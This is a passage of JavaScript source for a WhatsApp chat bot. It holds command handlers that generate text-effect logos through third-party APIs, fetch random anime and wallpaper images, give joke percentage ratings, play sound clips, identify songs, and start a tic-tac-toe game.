        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'pixelglitch': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}
case 'listcasesss': {
    const listCase = () => {
        const code = fs.readFileSync("./BigDaddy 3.js", "utf8");
        var regex = /case\s+'([^']+)':/g;
        var matches = [];
        var match;
        while ((match = regex.exec(code))) {
            matches.push(match[1]);
        }
        let teks = `*Total Commands*: ${matches.length} \n\n`;
        matches.forEach(function (x) {
            teks += "◦ " + x + "\n";
        });
        return teks;
    };
    replyphistar(listCase());
}
break;

case 'text2pdf': {
    if (!text) return replyphistar(`❌ Please provide text to convert into a PDF.\nExample: ${prefix + command} Hello, this is my PDF file.`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `🕒`, key: m.key } });
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `🕣`, key: m.key } });

        // API URL
        const apiUrl = `https://apis.davidcyriltech.my.id/tools/pdf?text=${encodeURIComponent(text)}`;

        // Fetch API response
        const response = await axios.get(apiUrl);
        const { success, download } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (success && download) {
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: download },
                mimetype: 'application/pdf',
                fileName: 'Converted_Text.pdf',
                caption: `✅ *PDF Generated Successfully!*\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate PDF. Please try again later.`);
        }
    } catch (error) {
        console.error('Error generating PDF:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'galaxystyle': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html`;
        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'lighteffects': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-light-effects-green-neon-online-429.html`;
        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'freecreate': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html`;
        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'makingneon': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html`;
        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'galaxywallpaper': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html`;
        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'sandsummer': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html`;
        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'multicoloredneon': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html`;
        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'luxurygold': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html`;
        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'summerbeach': {
    if (!text) return replyphistar(`Example: ${prefix + command} Phistar`);

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html`;
        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });

        if (status && BK9) {
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replyphistar(`❌ An error occurred. Please try again later.`);
    }
    break;
}
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo': case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming': case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko': {
    let heyy;
    if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json');
    if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json');
    if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json');
    if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json');
    if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json');
    if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json');
    if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json');
    if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json');
    if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json');
    if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json');
    if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json');
    if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json');
    if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json');
    if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json');
    if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json');
    if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json');
    if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json');
    if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json');
    if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json');
    if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json');
    if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json');
    if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json');
    if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json');
    if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json');
    if (/hinata/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hinata.json');
    if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json');
    if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json');
    if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json');
    if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json');
    if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json');
    if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json');
    if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json');
    if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json');
    if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json');
    if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json');
    if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json');
    if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json');
    if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json');
    if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json');
    if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json');
    if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json');
    if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json');
    if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json');
    if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json');
    if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json');
    if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json');
    if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json');
    if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json');
    if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json');
    if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json');
    if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json');
    if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json');
    if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json');
    if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json');
    if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json');
    if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json');
    if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json');
    if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json');
    if (/programming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json');
    if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json');
    if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json');
    if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json');
    if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json');
    if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json');
    if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json');
    if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json');
    if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json');
    if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json');
    if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json');
    if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json');
    if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json');
    if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json');
    if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json');
    if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json');
    if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json');
    if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json');
    if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json');
    if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json');
    if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json');
    if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json');
    if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json');
    let yeha = heyy[Math.floor(Math.random() * heyy.length)];
    PhistarBotInc.sendMessage(m.chat, { image: { url: yeha }, caption: '`Here You Go!`' }, { quoted: m });
}
break;

case 'stupidcheck': case 'uncleancheck': case 'hotcheck': case 'smartcheck': case 'greatcheck': case 'evilcheck': case 'dogcheck': case 'coolcheck': case 'gaycheck': case 'waifucheck': {
    cantik = body.slice(1);
    const okebnh1 = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100'];
    const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)];
    let perc = `%`;
    let msgs = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: xeonkak + perc
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: 'Generated'
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false,
                        ...await prepareWAMessageMedia({ image: fs.readFileSync('./thumb.png') }, { upload: PhistarBotInc.waUploadToServer })
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            "name": "quick_reply",
                            "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
                        }],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '',
                            newsletterName: '',
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: m });
    return await PhistarBotInc.relayMessage(m.chat, msgs.message, {});
}
break;

case 'sound1': case 'sound2': case 'sound3': case 'sound4': case 'sound5': case 'sound6': case 'sound7': case 'sound8': case 'sound9': case 'sound10': case 'sound11': case 'sound12': case 'sound13': case 'sound14': case 'sound15': case 'sound16': case 'sound17': case 'sound18': case 'sound19': case 'sound20': case 'sound21': case 'sound22': case 'sound23': case 'sound24': case 'sound25': case 'sound26': case 'sound27': case 'sound28': case 'sound29': case 'sound30': case 'sound31': case 'sound32': case 'sound33': case 'sound34': case 'sound35': case 'sound36': case 'sound37': case 'sound38': case 'sound39': case 'sound40': case 'sound41': case 'sound42': case 'sound43': case 'sound44': case 'sound45': case 'sound46': case 'sound47': case 'sound48': case 'sound49': case 'sound50': case 'sound51': case 'sound52': case 'sound53': case 'sound54': case 'sound55': case 'sound56': case 'sound57': case 'sound58': case 'sound59': case 'sound60': case 'sound61': case 'sound62': case 'sound63': case 'sound64': case 'sound65': case 'sound66': case 'sound67': case 'sound68': case 'sound69': case 'sound70': case 'sound71': case 'sound72': case 'sound73': case 'sound74': case 'sound75': case 'sound76': case 'sound77': case 'sound78': case 'sound79': case 'sound80': case 'sound81': case 'sound82': case 'sound83': case 'sound84': case 'sound85': case 'sound86': case 'sound87': case 'sound88': case 'sound89': case 'sound90': case 'sound91': case 'sound92': case 'sound93': case 'sound94': case 'sound95': case 'sound96': case 'sound97': case 'sound98': case 'sound99': case 'sound100': case 'sound101': case 'sound102': case 'sound103': case 'sound104': case 'sound105': case 'sound106': case 'sound107': case 'sound108': case 'sound109': case 'sound110': case 'sound111': case 'sound112': case 'sound113': case 'sound114': case 'sound115': case 'sound116': case 'sound117': case 'sound118': case 'sound119': case 'sound120': case 'sound121': case 'sound122': case 'sound123': case 'sound124': case 'sound125': case 'sound126': case 'sound127': case 'sound128': case 'sound129': case 'sound130': case 'sound131': case 'sound132': case 'sound133': case 'sound134': case 'sound135': case 'sound136': case 'sound137': case 'sound138': case 'sound139': case 'sound140': case 'sound141': case 'sound142': case 'sound143': case 'sound144': case 'sound145': case 'sound146': case 'sound147': case 'sound148': case 'sound149': case 'sound150': case 'sound151': case 'sound152': case 'sound153': case 'sound154': case 'sound155': case 'sound156': case 'sound157': case 'sound158': case 'sound159': case 'sound160': case 'sound161': {
    var resttt = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`);
    PhistarBotInc.sendMessage(m.chat, { audio: resttt, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
}
break;
case 'shazam': {
    // Ensure the command is used on audio or video under 4MB
    if (!/audio|video/.test(mime)) {
        return replyphistar(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an audio or video file with .shazam to identify the track.*`);
    }

    if (!quoted) {
        return replyphistar(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an audio or video file with .shazam to identify the track.*`);
    }

    // React to indicate processing
    await PhistarBotInc.sendMessage(m.chat, { react: { text: `🎙️`, key: m.key } });

    try {
        // Step 1: Download the media locally
        const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);

        // Check file size (4MB max for the Shazam API)
        const stats = fs.statSync(mediaPath);
        if (stats.size > 4 * 1024 * 1024) { // 4MB limit
            fs.unlinkSync(mediaPath);
            return replyphistar(`*FILE TOO LARGE!! MESSAGE :*\n\n> The file size exceeds 4MB, which is not supported by the Shazam API.`);
        }

        // Step 2: Upload the media to Catbox to get a public URL
        const uploadResponse = await uploadFile(mediaPath);

        if (!uploadResponse || !uploadResponse.url) {
            fs.unlinkSync(mediaPath);
            return replyphistar(`*UPLOAD ERROR!! MESSAGE :*\n\n> Failed to upload the file to uploadFile.`);
        }

        const mediaUrl = uploadResponse.url;

        // Step 3: Call the PaxSenix Shazam API
        const apiUrl = `https://api.paxsenix.biz.id/tools/shazam?url=${encodeURIComponent(mediaUrl)}`;
        const apiResponse = await axios.get(apiUrl);

        if (!apiResponse.data || !apiResponse.data.ok || !apiResponse.data.track) {
            fs.unlinkSync(mediaPath);
            return replyphistar(`*API ERROR!! MESSAGE :*\n\n> Failed to identify the track. Please try again later.`);
        }

        // Extract track information
        const track = apiResponse.data.track;
        const trackTitle = track.title || "Unknown Title";
        const trackArtist = track.artist || "Unknown Artist";
        const trackUrl = track.url || "No URL Available";
        const trackIsrc = track.isrc || "No ISRC Available";

        // Step 4: Send the result with the specified image
        const resultImage = 'https://files.catbox.moe/xdxmwk.jpg'; // Specified image
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: resultImage },
            caption: `🎵 *TRACK IDENTIFIED!!*\n\n` +
                     `*Title:* ${trackTitle}\n` +
                     `*Artist:* ${trackArtist}\n` +
                     `*ISRC:* ${trackIsrc}\n` +
                     `*More Info:* [Click Here](${trackUrl})\n\n` +
                     `> Generated`
        }, { quoted: m });

        // Clean up: Delete the downloaded file
        fs.unlinkSync(mediaPath);
    } catch (error) {
        console.error('Error in Shazam command:', error.message);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }

    // React to indicate success
    await PhistarBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m.key } });
    break;
}
case 'ttc':
case 'ttt':
case 'tictactoe': {
    let TicTacToe = require("./tictactoe.js");
    this.game = this.game ? this.game : {};
    if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replyphistar('You are still in the game');
    let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true));
    if (room) {
        replyphistar('Partner not found!');
        room.o = m.chat;
        room.game.playerO = m.sender;
        room.state = 'PLAYING';
        let arr = room.game.render().map(v => {
            return {
                X: '❌',
                O: '⭕',
                1: '1️⃣',
